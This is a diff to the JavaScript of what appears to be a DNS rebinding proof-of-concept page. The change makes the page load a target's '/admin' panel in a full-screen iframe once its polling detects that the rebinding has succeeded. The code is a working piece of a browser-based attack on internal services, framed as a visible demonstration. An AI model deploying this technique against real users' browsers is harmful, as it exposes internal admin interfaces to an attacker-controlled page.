@@ -41,6 +41,26 @@ Ciao ciao!
     updateStatus('Starting monitoring...', '#0066cc');
     document.body.appendChild(statusDiv);
     
+    function createAdminIframe() {
+        const iframe = document.createElement('iframe');
+        iframe.src = '/admin';
+        iframe.style.cssText = `
+            position: fixed;
+            top: 50px;
+            left: 0;
+            width: 100%;
+            height: calc(100vh - 50px);
+            border: 3px solid #ff0000;
+            background: white;
+            z-index: 9999;
+        `;
+        iframe.onload = function() {
+            updateStatus('DNS REBINDING DETECTED!<br>Admin page loaded in iframe below', '#ff0000');
+        };
+        document.body.appendChild(iframe);
+        return iframe;
+    }
+    
     async function checkAdminResource() {
         if (attackDetected || attemptCount >= maxAttempts) {
             return;
@@ -71,7 +91,7 @@ Ciao ciao!
             // This could indicate the rebinding has occurred
             if (attemptCount > 1) { // Ignore first attempt
                 attackDetected = true;
-                updateStatus('DNS REBINDING DETECTED!<br>Admin resource may be accessible', '#ff0000');
+                updateStatus('DNS REBINDING DETECTED!<br>Loading admin page in iframe...', '#ff0000');
                 
                 // Make it very visible
                 statusDiv.style.background = '#ffebee';
@@ -89,8 +109,8 @@ Ciao ciao!
                 `;
                 document.head.appendChild(style);
                 
-                // Try to access admin panel multiple times to confirm
-                confirmAttack();
+                // Create iframe to display the admin page
+                createAdminIframe();
             }
             
         } catch (error) {
@@ -135,9 +155,12 @@ Ciao ciao!
         xhr.onload = function() {
             if (!attackDetected) {
                 attackDetected = true;
-                updateStatus('DNS REBINDING DETECTED (XHR)!<br>Admin resource may be accessible', '#ff0000');
+                updateStatus('DNS REBINDING DETECTED (XHR)!<br>Loading admin page in iframe...', '#ff0000');
                 statusDiv.style.background = '#ffebee';
                 statusDiv.style.borderColor = '#ff0000';
+                
+                // Create iframe to display the admin page
+                createAdminIframe();
             }
         };
         
